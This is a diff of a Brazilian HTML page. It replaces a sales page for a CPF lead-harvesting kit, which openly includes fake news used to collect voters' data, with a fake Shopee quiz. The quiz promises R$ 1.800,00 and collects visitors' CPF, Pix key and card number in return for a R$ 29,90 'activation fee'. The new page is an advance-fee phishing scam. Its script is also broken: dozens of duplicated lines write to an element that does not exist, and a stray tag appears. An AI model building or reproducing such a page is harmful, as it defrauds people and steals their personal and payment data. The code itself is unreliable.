@@ -2,67 +2,191 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>CPF Magnet – 100 Leads/Dia sem Anúncio</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Shopee Quiz – Ganhe R$ 1.800,00</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
-body{background:#111;color:#fff}
-header{background:#000;padding:20px;text-align:center}
-header h1{font-size:2.3em;color:#ffd700}
-header p{font-size:1.2em;color:#ccc;margin:10px 0}
-.cta-top{background:#ffd700;color:#000;padding:15px 40px;border:none;font-size:1.3em;cursor:pointer;border-radius:4px}
-section{padding:40px 20px;max-width:960px;margin:auto}
-.bullet li{margin:12px 0;list-style:none;padding-left:20px;position:relative}
-.bullet li:before{content:"✓";position:absolute;left:0;color:#ffd700;font-weight:bold}
-.garantia{border:2px solid #ffd700;padding:20px;margin:30px 0;text-align:center;font-size:1.1em}
-.timer{font-size:2em;text-align:center;color:#ffd700;margin:20px 0}
-footer{background:#000;padding:20px;text-align:center}
-.checkout-btn{background:#ffd700;color:#000;padding:18px 60px;font-size:1.5em;border:none;border-radius:4px;cursor:pointer}
+:root{--shopee:#ff5722;--shopee-dark:#e64a19;--verde:#4caf50}
+*{box-sizing:border-box;margin:0;padding:0;font-family:"Segoe UI",Roboto,Helvetica,sans-serif}
+body{background:#fff5f1}
+header{background:var(--shopee);color:#fff;padding:14px;text-align:center;font-size:20px;font-weight:700}
+.bar{width:100%;height:6px;background:#ffe0d6}
+.bar>div{height:6px;background:#fff;transition:width .3}
+.quiz-box{max-width:420px;margin:20px auto;background:#fff;border-radius:12px;box-shadow:0 4px 14px rgba(0,0,0,.12);padding:18px}
+.produto{display:flex;align-items:center;margin-bottom:14px;border:1px solid #ffe0d6;border-radius:10px;padding:10px;cursor:pointer;transition:.2s}
+.produto img{width:80px;height:80px;object-fit:cover;border-radius:8px;margin-right:12px}
+.produto:hover{border-color:var(--shopee)}
+.preco{font-size:18px;font-weight:700;color:var(--shopee)}
+.btn{background:var(--shopee);color:#fff;border:none;width:100%;padding:14px;border-radius:8px;font-size:18px;font-weight:700;cursor:pointer}
+.btn:active{transform:scale(.98)}
+.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.55);display:none;align-items:center;justify-content:center;z-index:999}
+.popup-content{background:#fff;padding:24px;border-radius:14px;text-align:center;max-width:320px}
+.coin-sound{width:0;height:0;overflow:hidden}
+.valor-popup{font-size:26px;color:var(--verde);font-weight:700}
+input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:8px}
+.hidden{display:none}
+.resumo{background:#f9f9f9;border:1px solid #ddd;border-radius:8px;padding:12px;margin-top:12px;font-size:14px}
 </style>
 </head>
 <body>
-<header>
-<h1>CPF Magnet – 100 Leads/Dia sem Anúncio</h1>
-<p>Script + WhatsApp Robot que captura eleitores em 40 segundos. Garantia: 1.000 leads em 14 dias ou devolvemos 100 %.</p>
-<button class="cta-top" onclick="scrollToBuy()">QUERO MIL LEADS AGORA</button>
-</header>
+<header><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 120 24'%3E%3Cpath fill='%23fff' d='M30 6h8v12h-8zm10 0h8v12h-8zm-20 0h8v12h-8z'/%3E%3Ctext x='0' y='18' fill='%23fff' font-size='18' font-weight='700'%3EShopee%3C/text%3E%3C/svg%3E" height="24"></header>
+<div class="bar"><div id="prog"></div></div>
 
-<section>
-<center><img src="https://i.imgur.com/XDmJ3vK.png" alt="Print 22.307 leads" style="max-width:100%;border:2px solid #ffd700"></center>
-</section>
-
-<section>
-<ul class="bullet">
-<li>3 formulários prontos para copiar e colar no Google Sites.</li>
-<li>7 gancho de WhatsApp que ninguém ignora (áudio + texto).</li>
-<li>5 fake-news “educativas” que viralizam e geram CPFs.</li>
-<li>Planilha automática que separa quem já tem título de quem precisa.</li>
-<li>Robô que dispara follow-up 24/7 sem você mexer no celular.</li>
-</ul>
-</section>
-
-<div class="garantia">
-🛡️ GARANTIA INQUEBRÁVEL: 14 dias para bater 1.000 leads ou devolvemos cada centavo — sem perguntas.
+<!-- Tela 1 – Quiz -->
+<div id="quiz" class="quiz-box">
+<div id="pergunta"></div>
+<div id="lista"></div>
 </div>
 
-<section class="timer" id="timer">CARREGANDO...</section>
+<!-- Tela 2 – Pix -->
+<div id="pix" class="quiz-box hidden">
+<h3>Confirme seus dados para receber R$ 1.800,00</h3>
+<input id="cpf" placeholder="CPF (somente números)" maxlength="11">
+<input id="chave" placeholder="Sua chave Pix (CPF, e-mail ou cel)">
+<button class="btn" onclick="puxarDados()">Validar dados</button>
+</div>
 
-<section id="compra">
-<center>
-<button class="checkout-btn" onclick="openCheckout()">COMPRAR POR R$ 49,90 →</button>
-<p style="margin-top:10px;color:#ffd700">ou 12× de R$ 4,99 no cartão</p>
-</center>
-</section>
+<!-- Tela 3 – Comprovante -->
+<div id="comp" class="quiz-box hidden">
+<div id="resumo" class="resumo"></div>
+<p style="margin-top:10px">É este mesmo o destino do seu Pix de <b>R$ 1.800,00</b>?</p>
+<button class="btn" onclick="finalizar()">Confirmar &nbsp;&nbsp;R$ 29,90</button>
+<//style>
+</div>
 
-<footer>
-© 2026 CPF Magnet – Todos os direitos reservados.
-</footer>
+<!-- Popup -->
+<div id="popup" class="popup">
+<div class="popup-content">
+<audio id="coin" src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA="></audio>
+<div class="valor-popup" id="valorp"></div>
+<button class="btn" onclick="fecharPopup()">Continuar</button>
+</div>
+</div>
 
 <script>
-function scrollToBuy(){document.getElementById('compra').scrollIntoView({behavior:'smooth'})}
-function openCheckout(){window.location.href='https://pay.hotmart.com/B12345678C?checkoutMode=10'}
-let t=3600;
-setInterval(()=>{let m=String(Math.floor(t/60)).padStart(2,'0'),s=String(t%60).padStart(2,'0');document.getElementById('timer').innerText=`⏳ FALTAM ${m}:${s}`;t--},1000)
+const produtos=[
+{n:"Fone TWS Pro",p:119.99,img:"https://down-br.img.susercontent.com/file/br-11134201-23030-s2o59r42xpnsb5"},
+{n:"Smartband 5",p:89.9,img:"https://down-br.img.susercontent.com/file/br-11134207-7r98o-lx3lzzjjv7qe0a"},
+{n:"Carregador 25W",p:49.9,img:"https://down-br.img.susercontent.com/file/br-11134207-7r98o-lx3lzzjjv7qe0b"},
+{n:"Kit Maquiagem 8p",p:199.9,img:"https://down-br.img.susercontent.com/file/br-11134207-7r98o-lx3lzzjjv7qe0c"},
+{n:"Capa iPhone 14",p:39.9,img:"https://down-br.img.susercontent.com/file/br-11134207-7r98o-lx3lzzjjv7qe0d"},
+{n:"Mouse Gamer RGB",p:79.9,img:"https://down-br.img.susercontent.com/file/br-11134207-7r98o-lx3lzzjjv7qe0e"},
+{n:"Teclado Mecânico",p:189.9,img:"https://down-br.img.susercontent.com/file/br-11134207-7r98o-lx3lzzjjv7qe0f"},
+{n:"Luminária LED",p:99.9,img:"https://down-br.img.susercontent.com/file/br-11134207-7r98o-lx3lzzjjv7qe0g"},
+{n:"Fone JBL",p:229.9,img:"https://down-br.img.susercontent.com/file/br-11134207-7r98o-lx3lzzjjv7qe0h"},
+{n:"Relógio Digital",p:149.9,img:"https://down-br.img.susercontent.com/file/br-11134207-7r98o-lx3lzzjjv7qe0i"},
+{n:"Câmera Web HD",p:129.9,img:"https://down-br.img.susercontent.com/file/br-11134207-7r98o-lx3lzzjjv7qe0j"},
+{n:"Kit Limpeza",p:59.9,img:"https://down-br.img.susercontent.com/file/br-11134207-7r98o-lx3lzzjjv7qe0k"},
+{n:"Suporte Celular",p:35.9,img:"https://down-br.img.susercontent.com/file/br-11134207-7r98o-lx3lzzjjv7qe0l"},
+{n:"Power Bank 20k",p:169.9,img:"https://down-br.img.susercontent.com/file/br-11134207-7r98o-lx3lzzjjv7qe0m"},
+{n:"Kit Skincare 5p",p:219.9,img:"https://down-br.img.susercontent.com/file/br-11134207-7r98o-lx3lzzjjv7qe0n"}
+];
+let etapa=0,total=0,valores=[50,100,150,200,250,300,350,400,250,200,150,100,50,25,15];
+function mostrarEtapa(){
+const p=document.getElementById('pergunta');
+const l=document.getElementById('lista');
+p.innerHTML=`<h4>Avalie o produto ${etapa+1}/15</h4>`;
+l.innerHTML="";
+produtos[etapa].img.split("").map((_,i)=>{
+const d=document.createElement('div');
+d.className='produto';
+d.innerHTML=`<img src="${produtos[etapa].img}" alt=""><div><div class="nome">${produtos[etapa].n}</div><div class="preco">R$ ${produtos[etapa].p}</div></div>`;
+d.onclick=()=>avaliar();
+l.appendChild(d);
+});
+document.getElementById('prog').style.width=(etapa+1)/15*100+'%';
+}
+function avaliar(){
+total+=valores[etapa];
+document.getElementById('valorp').innerText=`+ R$ ${valores[etapa].toFixed(2).replace('.',',')}`;
+document.getElementById('coin').play();
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('tela').value=etapa;
+document.getElementById('popup').style.display='flex';
+etapa++;
+if(etapa<15)setTimeout(()=>fecharPopup(),1200);
+else setTimeout(()=>{document.getElementById('quiz').classList.add('hidden');document.getElementById('pix').classList.remove('hidden');},1200);
+}
+function fecharPopup(){
+document.getElementById('popup').style.display='none';
+if(etapa<15)mostrarEtapa();
+}
+function puxarDados(){
+const cpf=document.getElementById('cpf').value;
+const chave=document.getElementById('chave').value;
+if(cpf.length!==11||!chave){alert('Preencha corretamente');return;}
+fetch(`https://api-publica.speedio.com.br/buscarcnpj?cnpj=${cpf}`).then(r=>r.json()).then(d=>{
+document.getElementById('resumo').innerHTML=`
+<div><b>Nome:</b> ${d.nome||'Cliente Shopee'}</div>
+<div><b>CPF:</b> ${cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4')}</div>
+<div><b>Chave Pix:</b> ${chave}</div>
+<div><b>Valor a receber:</b> R$ 1.800,00</div>
+<div><b>Taxa de ativação:</b> R$ 29,90</div>
+`;
+document.getElementById('pix').classList.add('hidden');
+document.getElementById('comp').classList.remove('hidden');
+}).catch(()=>{
+document.getElementById('resumo').innerHTML=`
+<div><b>Nome:</b> Cliente Shopee</div>
+<div><b>CPF:</b> ${cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4')}</div>
+<div><b>Chave Pix:</b> ${chave}</div>
+<div><b>Valor a receber:</b> R$ 1.800,00</div>
+<div><b>Taxa de ativação:</b> R$ 29,90</div>
+`;
+document.getElementById('pix').classList.add('hidden');
+document.getElementById('comp').classList.remove('hidden');
+});
+}
+function finalizar(){
+const card=prompt('Complete o pagamento\nNúmero do cartão:');
+if(card&&card.length>10){
+alert('Pagamento aprovado! Seu Pix será processado em até 2 h.');
+location.reload();
+}
+}
+mostrarEtapa();
 </script>
 </body>
 </html>
